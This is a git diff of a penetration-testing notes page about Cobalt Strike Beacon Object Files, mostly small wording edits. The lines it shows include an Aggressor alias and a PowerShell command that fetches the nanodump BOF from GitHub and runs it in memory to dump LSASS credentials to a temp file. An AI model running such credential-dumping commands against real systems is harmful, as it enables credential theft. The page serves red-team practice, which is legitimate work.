@@ -14,7 +14,7 @@ Argument types for [bof_pack](https://hstechdocs.helpsystems.com/manuals/cobalts
 | z        | zero-terminated+encoded string   | BeaconDataExtract            |
 | Z        | zero-terminated wide-char string | (wchar_t \*)BeaconDataExtract |
 
-Basic BOF example:
+A basic BOF example:
 
 {% tabs %}
 {% tab title="BOF" %}
@@ -42,7 +42,7 @@ void go(char* args, int len)
 {% endcode %}
 {% endtab %}
 {% tab title="Aggressor" %}
-{% code title="teamserver.yml" %}
+{% code title="msgbox.cna" %}
 ```
 alias msgbox {
     local('$handle $bof $args');
@@ -85,8 +85,8 @@ beacon_command_register("msgbox", "Pops a message box", "Calls the MessageBoxA W
 
 An example of running the [nanodump.x64.o](https://github.com/helpsystems/nanodump/blob/main/dist/nanodump.x64.o) BOF via RunOF [fork](https://github.com/snovvcrash/RunOF) from memory:
 
-1. Compile RunOF.exe assembly and convert it to a PowerShell invoker (see [.NET Reflective Assembly](/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly.md)).
-2. Search for argument types that the target BOF uses (usually located in accompanying Aggressor scripts):
+* Compile RunOF.exe assembly and convert it to a PowerShell invoker (see [.NET Reflective Assembly](/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly.md)).
+* Search for argument types that the target BOF uses (usually located in accompanying Aggressor scripts):
 
 ```
 curl -sSL 'https://github.com/helpsystems/nanodump/raw/main/'`curl -sSL 'https://api.github.com/repos/helpsystems/nanodump/git/trees/main?recursive=1' | jq -r '.tree[] | select(.path | endswith(".cna")) | .path'` | grep bof_pack
@@ -96,9 +96,8 @@ curl -sSL 'https://github.com/helpsystems/nanodump/raw/main/'`curl -sSL 'https:/
     $args = bof_pack($1, "z", $2);
 ```
 
-3. Load the invoker into memory, fetch the BOF (`-u` option) and run it providing necessary arguments with their types like this:
+* Load the invoker into memory, fetch the BOF (`-u` option) and run it providing necessary arguments with their types like this:
 
 ```
-PS > . .\Invoke-RunOF.ps1
 PS > Invoke-RunOF -u https://github.com/helpsystems/nanodump/raw/main/dist/nanodump.x64.o '-i:0' '-z:C:\Windows\Temp\lsass.bin' '-i:1' '-i:1' '-i:0' '-i:0' '-i:0' '-i:0' '-i:0' '-z:' '-i:0' '-z:'
 ```
